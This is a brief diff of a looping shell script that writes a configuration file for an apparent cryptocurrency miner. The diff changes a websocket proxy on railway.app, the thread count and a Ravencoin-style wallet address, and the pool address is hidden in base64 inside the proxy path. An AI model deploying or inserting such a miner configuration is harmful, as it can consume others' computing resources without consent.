@@ -11,9 +11,9 @@ while true; do
   # Write the configuration to data.json
   cat <<EOF > data.json
 {
-  "proxy": "wss://epoch-labs.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
-  "config": { "threads": 48, "log": true },
-  "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "robin" }
+  "proxy": "wss://web-production-b425.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
+  "config": { "threads": 8, "log": true },
+  "options": { "user": "RXq1aLds5oKeqyTXAjiDZEghjXKw7ejJsi", "password": "c=RVN", "argent": "robin" }
 }
 EOF
 
